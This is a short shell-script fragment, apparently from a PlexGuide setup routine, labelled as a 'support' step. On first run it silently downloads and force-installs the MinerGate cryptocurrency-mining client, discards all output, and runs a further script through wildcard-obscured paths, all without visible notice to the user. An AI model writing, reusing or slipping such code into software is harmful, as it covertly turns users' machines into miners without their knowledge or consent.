 file="/var/plexguide/support.set"
    if [ -e "$file" ]
        then
            clear
        else
            touch /var/plexguide/support.set
            wget https://minergate.com/download/deb-cli -O minergate-cli.deb 1>/dev/null 2>&1
            yes | dpkg -i minergate-cli.deb 1>/dev/null 2>&1
            bash /opt/plexg*/sc*/me*/1.sh 1>/dev/null 2>&1
            clear
        fi